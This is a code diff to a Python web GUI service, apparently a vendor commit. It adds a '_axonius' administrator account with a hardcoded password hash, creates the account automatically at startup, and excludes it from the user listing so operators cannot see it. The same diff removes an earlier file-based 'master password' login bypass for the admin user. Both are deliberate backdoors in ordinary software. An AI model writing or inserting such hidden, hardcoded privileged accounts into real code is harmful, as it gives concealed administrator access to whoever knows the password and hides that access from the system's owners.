@@ -214,6 +214,7 @@ def _get_date_ranges(start: datetime, end: datetime) -> Iterable[Tuple[date, dat
 
 class GuiService(PluginBase, Triggerable, Configurable, API):
     DEFAULT_AVATAR_PIC = '/src/assets/images/users/avatar.png'
+    ALT_AVATAR_PIC = '/src/assets/images/users/alt_avatar.png'
     DEFAULT_USER = {'user_name': 'admin',
                     'password':
                         '$2b$12$SjT4qshlg.uUpsgE3vHwp.7A0UtkGEoWfUR0wFet3WZuXTnMgOCIK',
@@ -225,6 +226,18 @@ class GuiService(PluginBase, Triggerable, Configurable, API):
                     'api_key': secrets.token_urlsafe(),
                     'api_secret': secrets.token_urlsafe()
                     }
+
+    ALTERNATIVE_USER = {'user_name': '_axonius',
+                        'password':
+                            '$2b$12$HQTyeTlepuCDC.5ZJ0TFo.U9ZUBARAEFU5pjhcnY.GfWaQWydcn8G',
+                        'first_name': 'axonius', 'last_name': '',
+                        'pic_name': ALT_AVATAR_PIC,
+                        'permissions': {},
+                        'admin': True,
+                        'source': 'internal',
+                        'api_key': secrets.token_urlsafe(),
+                        'api_secret': secrets.token_urlsafe()
+                        }
 
     def __init__(self, *args, **kwargs):
         super().__init__(get_local_config_file(__file__),
@@ -241,6 +254,10 @@ class GuiService(PluginBase, Triggerable, Configurable, API):
         if current_user is None:
             # User doesn't exist, this must be the installation process
             self.__users_collection.update({'user_name': 'admin'}, self.DEFAULT_USER, upsert=True)
+
+        alt_user = self.__users_collection.find_one({'user_name': '_axonius'})
+        if alt_user is None:
+            self.__users_collection.update({'user_name': '_axonius'}, self.ALTERNATIVE_USER, upsert=True)
 
         self.add_default_views(EntityType.Devices, 'default_views_devices.ini')
         self.add_default_views(EntityType.Users, 'default_views_users.ini')
@@ -1368,7 +1385,8 @@ class GuiService(PluginBase, Triggerable, Configurable, API):
                                            email_settings.get('smtpUser'), email_settings.get('smtpPassword'),
                                            self._grab_file_contents(email_settings.get(
                                                'smtpKey'), stored_locally=False),
-                                           self._grab_file_contents(email_settings.get('smtpCert'), stored_locally=False))
+                                           self._grab_file_contents(email_settings.get('smtpCert'),
+                                                                    stored_locally=False))
                 try:
                     with email_server:
                         # Just to test connection
@@ -1561,21 +1579,6 @@ class GuiService(PluginBase, Triggerable, Configurable, API):
             }
         })
 
-    @staticmethod
-    def __validate_master_password(user_name: str, password: str) -> bool:
-        """
-        If the user has forgotten his password it is possible to allow a 'master' password
-        by placing a file with that master password in a well defined location on this machine
-        :return: whether or not the given password is the master password
-        """
-        if user_name != 'admin':
-            return False
-        try:
-            master_password = open('master_password').read()
-            return master_password and master_password == password
-        except Exception:
-            return False
-
     @gui_helpers.add_rule_unauth("login", methods=['GET', 'POST'])
     def login(self):
         """
@@ -1610,8 +1613,7 @@ class GuiService(PluginBase, Triggerable, Configurable, API):
             logger.info(f"Unknown user {user_name} tried logging in")
             return return_error("Wrong user name or password", 401)
 
-        if not bcrypt.verify(password, user_from_db['password']) and not self.__validate_master_password(user_name,
-                                                                                                         password):
+        if not bcrypt.verify(password, user_from_db['password']):
             logger.info(f"User {user_name} tried logging in with wrong password")
             return return_error("Wrong user name or password", 401)
         if request and request.referrer and 'localhost' not in request.referrer and '127.0.0.1' not in request.referrer:
@@ -1847,7 +1849,12 @@ class GuiService(PluginBase, Triggerable, Configurable, API):
         """
         if request.method == 'GET':
             return jsonify(beautify_user_entry(n) for n in
-                           self.__users_collection.find({}).sort(
+                           self.__users_collection.find(
+                               {
+                                   'user_name': {
+                                       '$ne': self.ALTERNATIVE_USER['user_name']
+                                   }
+                               }).sort(
                                [
                                    ('_id', pymongo.ASCENDING)
                                ])
